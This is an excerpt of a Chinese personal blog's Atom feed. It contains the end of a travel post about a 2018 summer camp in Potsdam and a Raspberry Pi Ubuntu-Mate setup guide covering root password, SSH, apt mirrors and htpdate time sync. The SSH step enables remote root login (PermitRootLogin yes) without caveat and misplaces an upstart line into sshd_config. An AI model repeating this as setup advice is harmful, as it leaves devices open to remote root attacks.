title="关于体验"></a>关于体验</h4><p>得天独厚充满自然气息的环境，德意志联邦体系下精致的美式校园，确实别有特色（其实就是见识少，觉得啥都新鲜!）不大但五脏俱全，容纳500人足以的研究型学院。</p><p>结合这四天的体验来看，总体上给我的感觉就是“慢”吧，早上9点开始才工作对于一个天朝的大学生来说都是挺羡慕的吧[/偷笑]。从细节上看，无论是水池的排水速度，还是自动门窗的阻尼，都给人一种仪式感、时间滞怠的感觉。在这里还要感谢过去折腾的两年，所以虽然英语不太好，课程听起来还不是很费劲，期待下次实践课，作为工科生感觉挺有意思！[/偷笑]</p><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/HPI.gif" width="80%" alt="图片名称" align="center"></p><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/IMG_0912.jpg" width="80%" alt="图片名称" align="center"></p><h4 id="关于饮食"><a href="#关于饮食" class="headerlink" title="关于饮食"></a>关于饮食</h4><p>尝尽四天酸甜辣咸的“人间美味”后不禁流下泪水:sob:，虽然已经被安排地无微不至了，但请原谅我作为一个传统亚洲人的味觉真的接受不了这么重地口味，被各种奇怪地酱料支配……</p><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/IMG_0897.jpg" width="80%" alt="图片名称" align="center"></p><p style="text-align: center;">（随手拍系列，勉强还能接受的早餐）</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;9:07 pm 13.07.2018（GET+2）——DUT-HPI夏令营德国之行第四天；&lt;br&gt;倒过时差后人也比较清醒了，毕竟是第一次跨过The Great Wall，闲来无聊记点东西吧…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;经过好一翻折腾，到达了&lt;strong&gt;Potsdam&lt;/strong&gt;（准确地说是柏林与勃兰登堡洲的交界）。环境没什么好说的，现代化老牌发达国家的气质&lt;br&gt;
    
    </summary>
    
      <category term="足迹" scheme="https://yespace.xyz/categories/%E8%B6%B3%E8%BF%B9/"/>
    
    
      <category term="德国" scheme="https://yespace.xyz/tags/%E5%BE%B7%E5%9B%BD/"/>
    
      <category term="生活" scheme="https://yespace.xyz/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>RaspberryPI Ubuntu-Mate基本配置</title>
    <link href="https://yespace.xyz/2018/06/29/Raspberrypi/"/>
    <id>https://yespace.xyz/2018/06/29/Raspberrypi/</id>
    <published>2018-06-29T01:41:48.000Z</published>
    <updated>2019-12-30T10:09:11.456Z</updated>
    
    <content type="html"><![CDATA[<h2 id="树莓派-3B"><a href="#树莓派-3B" class="headerlink" title="树莓派 3B"></a>树莓派 3B</h2><p>最近研究了一下新“玩具”（RaspberryPi 3B)，尝试了官方的<a href="https://www.raspberrypi.org/downloads/raspbian/" target="_blank" rel="noopener">RASPBIAN</a>，感觉不是很好用，特别是蓝牙的配置，最后果断转战了熟悉的<a href="http://ubuntu-mate.org/download/" target="_blank" rel="noopener">Ubuntu-Mate</a>。</p><a id="more"></a><blockquote><p>这里补充一下，RASPBIAN的CPU性能优化应该是所有稳定版系统中最好的，至少在Ubuntu-Mate上的CPU调度机制有问题。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在官网下载了最新的16.04版本，使用<a href="https://sourceforge.net/projects/win32diskimager/files/latest/download" target="_blank" rel="noopener">Win32DiskImager</a>烧录进TF卡，插到树莓派上，上电开机就OK了（如果开机失败，基本上都是供电的问题，建议更换适配器和usb线），整个安装过程还是比较简单的。</p><blockquote><p>然后就是配置部分，下面记录一些我的基本配置（基本上就是怕自己忘了做个备份…）</p></blockquote><h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberry:~$ sudo passwd     //首次配置root密码</span><br><span class="line">pi@raspberry:~$ su root         //切换root用户</span><br></pre></td></tr></table></figure><h3 id="配置SSH服务"><a href="#配置SSH服务" class="headerlink" title="配置SSH服务"></a>配置SSH服务</h3><p>由于ubuntu-mate已经预装了ssh-server，直接配置服务就行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberry:~$ sudo nano /etc/ssh/sshd_config  //修改ssh配置文件</span><br><span class="line">PermitRootLogin yes                             //可以使用root用户进行远程登陆</span><br><span class="line">start on filesystem or runlevel [2345]          //开机自启</span><br><span class="line">pi@raspberry:~$ sudo /etc/init.d/ssh restart或sudo service ssh restart //重启ssh服务</span><br></pre></td></tr></table></figure></p><h3 id="修改镜像源"><a href="#修改镜像源" class="headerlink" title="修改镜像源"></a>修改镜像源</h3><p>由于ubuntu默认的镜像站速度不是很理想，可以考虑更换国内的镜像站，亲测清华<a href="https://mirrors.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/</a>和中科大<a href="https://mirrors.ustc.edu.cn/" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/</a>的在教育网内速度都还可以，其它的没试过。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberry:~$ sudo nano /etc/apt/sources.list&lt;/pre&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>修改为下面的内容：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ xenial main restricted universe mu$</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ xenial main restricted univers$</span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ xenial-updates main restricted uni$</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ xenial-updates main restricted$</span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ xenial-security main restricted un$</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ xenial-security main restricte$</span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ xenial-backports main restricted u$</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ xenial-backports main restrict$</span><br></pre></td></tr></table></figure><p><strong>然后更新软件源（这里时间可能比较长）</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberry:~$ sudo apt-get update</span><br><span class="line">pi@raspberry:~$ sudo apt-get upgrade</span><br></pre></td></tr></table></figure></p><p><strong>更新完之后重启系统</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberry:~$ sudo reboot</span><br></pre></td></tr></table></figure></p><h2 id="HTPDATE同步时间"><a href="#HTPDATE同步时间" class="headerlink" title="HTPDATE同步时间"></a>HTPDATE同步时间</h2><p>树莓派的时间同步是一个麻烦的问题，首先树莓派没有独立的电源用于保存时间设置，所以每次系统重启后系统时间都得重新设置，而且由于各地网络状况不同，NTP时间同步服务很可能都被墙了，于是就有人开发出了通过HTTP报头信息来进行时间同步的服务（会有1~2s的延时…）。</p><h3 id="HTPDATE安装"><a href="#HTPDATE安装" class="headerlink" title="HTPDATE安装"></a>HTPDATE安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//下载源码</span><br><span class="line">pi@raspberry:~$ git clone https://github.com/iridium77/htpdate.git</span><br><span class="line">pi@raspberry:~$ cd htpdate</span><br><span class="line">//编译</span><br><span class="line">pi@raspberry:~$ sudo make</span><br><span class="line">//安装</span><br><span class="line">pi@raspberry:~$ sudo make install</span><br><span class="line">//同步时间</span><br><span class="line">pi@raspberry:~$ sudo htpdate -t -s ntp.neu.edu.cn</span><br></pre></td></tr></table></figure><h3 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberry:~$ sudo vim /etc/rc.local</span><br><span class="line">//在exit 0前加上</span><br><span class="line">htpdate -t -s ntp.neu.edu.cn</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;树莓派-3B&quot;&gt;&lt;a href=&quot;#树莓派-3B&quot; class=&quot;headerlink&quot; title=&quot;树莓派 3B&quot;&gt;&lt;/a&gt;树莓派 3B&lt;/h2&gt;&lt;p&gt;最近研究了一下新“玩具”（RaspberryPi 3B)，尝试了官方的&lt;a href=&quot;https://www.raspberrypi.org/downloads/raspbian/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;RASPBIAN&lt;/a&gt;，感觉不是很好用，特别是蓝牙的配置，最后果断转战了熟悉的&lt;a href=&quot;http://ubuntu-mate.org/download/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Ubuntu-Mate&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="折腾笔记" scheme="https://yespace.xyz/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="树莓派" scheme="https://yespace.xyz/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
      <category term="操作系统" scheme="https://yespace.xyz/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
</feed>
